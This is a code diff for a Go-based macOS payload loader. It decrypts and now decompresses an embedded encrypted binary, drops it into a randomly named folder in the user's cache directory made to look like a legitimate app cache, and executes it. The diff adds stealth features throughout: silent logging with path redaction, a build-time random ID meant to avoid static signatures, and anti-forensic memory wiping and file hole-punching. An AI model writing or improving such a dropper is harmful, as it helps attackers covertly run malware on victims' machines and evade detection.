@@ -5,13 +5,17 @@ package main
 
 import (
 	_ "embed"
+	"bytes"
+	"compress/zlib"
 	"crypto/rand"
 	"crypto/subtle"
 	"fmt"
+	"io"
 	"math/big"
 	"os"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"syscall"
 	"unsafe"
 
@@ -25,12 +29,25 @@ type stealthLogger struct {
 	enabled bool
 }
 
-// logf prints a message only if logging is enabled
+// logf prints a message only if logging is enabled, obfuscating paths
 func (s *stealthLogger) logf(format string, args ...interface{}) {
 	if s.enabled {
-		// Write to /dev/null or a temporary file instead of stdout/stderr
-		// which would show up in system.log
-		_ = fmt.Sprintf(format, args...)
+		// Obfuscate any paths in the message to avoid revealing actual locations
+		msg := fmt.Sprintf(format, args...)
+		
+		// Replace any paths with [REDACTED_PATH]
+		if strings.Contains(msg, "/") {
+			// Check if this looks like a path message
+			if strings.Contains(msg, "path") || strings.Contains(msg, "file") || 
+			   strings.Contains(msg, "directory") || strings.Contains(msg, "executing") {
+				// Replace the actual path with a placeholder
+				msg = "[*] " + strings.Split(msg, ":")[0] + " [REDACTED_PATH]"
+			}
+		}
+		
+		// In production, don't output anything
+		// In debug mode, could write to a secure location
+		_ = msg
 	}
 }
 
@@ -42,6 +59,11 @@ func (s *stealthLogger) fatal(format string, args ...interface{}) {
 
 // Create a global logger instance
 var logger = &stealthLogger{enabled: false}
+
+// buildTimeRandomID is a random ID generated at build time
+// This will be replaced during the build process with a random value
+// to avoid static signatures
+var buildTimeRandomID = "RANDOM_ID_PLACEHOLDER"
 
 //go:embed payload.cbor
 var payloadData []byte
@@ -58,6 +80,9 @@ const (
 const (
 	archARM64 = 1
 	archX86_64 = 2
+	
+	// macOS specific syscall numbers
+	SYS_MADVISE = 75 // macOS specific syscall number
 )
 
 // PayloadData represents the structure of our CBOR payload
@@ -66,6 +91,7 @@ type PayloadData struct {
 	Password       []byte `cbor:"password"`
 	Salt           []byte `cbor:"salt"`
 	Nonce          []byte `cbor:"nonce"`
+	Compressed     bool   `cbor:"compressed,omitempty"` // Flag to indicate if data is compressed
 	ArgonParams    struct {
 		Time    uint32 `cbor:"time"`
 		Memory  uint32 `cbor:"memory"`
@@ -96,7 +122,6 @@ func main() {
 	// We'll use MADV_NOCORE which is the macOS equivalent
 	// But we need to use the raw syscall since it's not exposed in Go's syscall package
 	const MADV_NOCORE = 5 // macOS specific
-	const SYS_MADVISE = 75 // macOS specific syscall number
 	_, _, errno := syscall.Syscall(SYS_MADVISE, 
 	   uintptr(unsafe.Pointer(&machoBytes[0])), 
 	   uintptr(len(machoBytes)), 
@@ -151,6 +176,28 @@ func decryptFile() ([]byte, error) {
 		return nil, err
 	}
 	
+	// Check if the data was compressed and decompress if needed
+	if payload.Compressed {
+		logger.logf("Decompressing payload data")
+		
+		// Create a reader for the compressed data
+		zr, err := zlib.NewReader(bytes.NewReader(decryptedBytes))
+		if err != nil {
+			return nil, fmt.Errorf("failed to create decompression reader: %v", err)
+		}
+		defer zr.Close()
+		
+		// Read the decompressed data
+		var decompressed bytes.Buffer
+		_, err = io.Copy(&decompressed, zr)
+		if err != nil {
+			return nil, fmt.Errorf("failed to decompress data: %v", err)
+		}
+		
+		// Replace the decrypted bytes with the decompressed data
+		decryptedBytes = decompressed.Bytes()
+	}
+	
 	return decryptedBytes, nil
 }
 
@@ -182,6 +229,14 @@ func secureWipe(data []byte) {
 	// Ensure the wipe isn't optimized away
 	runtime.KeepAlive(data)
 	runtime.KeepAlive(dataPtr)
+	
+	// Use MADV_FREE to immediately reclaim memory pages
+	// MADV_FREE = 8 on macOS
+	const MADV_FREE = 8
+	_, _, _ = syscall.Syscall(SYS_MADVISE,
+		uintptr(dataPtr),
+		uintptr(len(data)),
+		uintptr(MADV_FREE))
 	
 	// Force garbage collection
 	runtime.GC()
@@ -251,9 +306,18 @@ func getTempPath() (string, error) {
 	}
 	
 	// Create a random subfolder in the user cache dir to blend in with other cache files
-	randomAppName, err := generateRandomString(8)
-	if err != nil {
-		return "", err
+	// Use the build-time random ID if available, otherwise generate one
+	var bundlePrefix string
+	if buildTimeRandomID != "RANDOM_ID_PLACEHOLDER" {
+		bundlePrefix = buildTimeRandomID
+	} else {
+		randomAppName, err := generateRandomString(8)
+		if err != nil {
+			// Fall back to a generic name if random generation fails
+			bundlePrefix = "cache"
+		} else {
+			bundlePrefix = randomAppName
+		}
 	}
 	
 	randomStr, err := generateRandomString(12)
@@ -262,7 +326,12 @@ func getTempPath() (string, error) {
 	}
 	
 	// Create a path that looks like a legitimate cache file
-	tmpDir := filepath.Join(userCacheDir, "com."+randomAppName+".cache")
+	// Using common prefixes that blend with system caches
+	legitPrefixes := []string{"com.", "org.", "io.", "net."}
+	random, _ := rand.Int(rand.Reader, big.NewInt(int64(len(legitPrefixes))))
+	prefix := legitPrefixes[random.Int64()]
+	
+	tmpDir := filepath.Join(userCacheDir, prefix+bundlePrefix+".cache")
 	
 	// Create the directory if it doesn't exist
 	if err := os.MkdirAll(tmpDir, 0700); err != nil {
@@ -304,19 +373,32 @@ func punchHole(fd int) error {
 	// Sync to ensure writes hit disk
 	syscall.Fsync(fd)
 	
-	// Now punch a hole in the file using F_PUNCHHOLE if available
+	// Now punch a hole in the file using F_PUNCHHOLE
 	// Note: This is macOS specific and may not work on all filesystems
 	// The constants below are from macOS fcntl.h
 	const F_PUNCHHOLE = 99
 	
-	// Try to punch a hole in the entire file
-	_, _, errno := syscall.Syscall6(
+	// Define the fpunchhole_t structure for macOS
+	type fpunchhole_t struct {
+		Offset int64
+		Length int64
+	}
+	
+	// Create the punch hole request
+	punchHoleReq := fpunchhole_t{
+		Offset: 0,
+		Length: fileSize,
+	}
+	
+	// Convert the struct to a pointer
+	punchHolePtr := unsafe.Pointer(&punchHoleReq)
+	
+	// Try to punch a hole in the entire file using the proper fcntl call
+	_, _, errno := syscall.Syscall(
 		syscall.SYS_FCNTL,
 		uintptr(fd),
 		uintptr(F_PUNCHHOLE),
-		uintptr(0), // offset
-		uintptr(fileSize), // length
-		0, 0,
+		uintptr(punchHolePtr),
 	)
 	
 	if errno != 0 {
@@ -334,48 +416,51 @@ func executeMachO(machoBytes []byte, arch int) {
 		logger.fatal("Failed to generate temporary path: %v", err)
 	}
 	
-	logger.logf("Dropping decrypted Mach-O binary to: %s", tmpPath)
+	logger.logf("Dropping decrypted binary to: %s", tmpPath)
 	
-	// Write the decrypted Mach-O binary to the temporary file
-	if err := os.WriteFile(tmpPath, machoBytes, 0700); err != nil {
-		logger.fatal("Failed to write temporary file: %v", err)
-	}
-	
-	// Open the file for hole punching later
-	fd, err := syscall.Open(tmpPath, syscall.O_RDWR, 0)
+	// Open the file for writing and later hole punching
+	fd, err := syscall.Open(tmpPath, syscall.O_RDWR|syscall.O_CREAT|syscall.O_TRUNC, 0700)
 	if err != nil {
-		logger.logf("Warning: Failed to open file for hole punching: %v", err)
+		logger.fatal("Failed to create temporary file: %v", err)
 	}
+	// Ensure file descriptor is always closed
+	defer syscall.Close(fd)
+	
+	// Write the decrypted Mach-O binary to the file descriptor
+	_, err = syscall.Write(fd, machoBytes)
+	if err != nil {
+		logger.fatal("Failed to write to temporary file: %v", err)
+	}
+	
+	// Sync to ensure writes hit disk
+	syscall.Fsync(fd)
 	
 	// Securely wipe the decrypted binary from memory
-	logger.logf("Securely wiping %d bytes of decrypted binary from memory", len(machoBytes))
+	logger.logf("Securely wiping binary from memory")
 	secureWipe(machoBytes)
 	
 	// Verify the file exists and is executable before attempting to execute it
 	if _, err := os.Stat(tmpPath); err != nil {
-		logger.fatal("Error: File does not exist or cannot be accessed: %v", err)
+		logger.fatal("Error: File does not exist or cannot be accessed")
 	}
 	
-	logger.logf("Executing binary at: %s", tmpPath)
+	logger.logf("Executing binary")
 	
 	// Execute the binary using syscall.Exec which replaces the current process
 	err = syscall.Exec(tmpPath, []string{tmpPath}, os.Environ())
 	
 	// If we reach here, exec failed
-	logger.logf("Exec failed: %v, attempting cleanup", err)
+	logger.logf("Exec failed, attempting cleanup")
 	
-	// Punch a hole in the file if we have a valid file descriptor
-	if fd > 0 {
-		if err := punchHole(fd); err != nil {
-			logger.logf("Warning: Failed to punch hole in file: %v", err)
-		}
-		syscall.Close(fd)
+	// Punch a hole in the file
+	if err := punchHole(fd); err != nil {
+		logger.logf("Warning: Failed to punch hole in file")
 	}
 	
 	// Remove the file
 	if err := os.Remove(tmpPath); err != nil {
-		logger.logf("Warning: Failed to remove temporary file: %v", err)
+		logger.logf("Warning: Failed to remove temporary file")
 	}
 	
-	logger.fatal("Failed to execute binary: %v", err)
+	logger.fatal("Failed to execute binary")
 } 
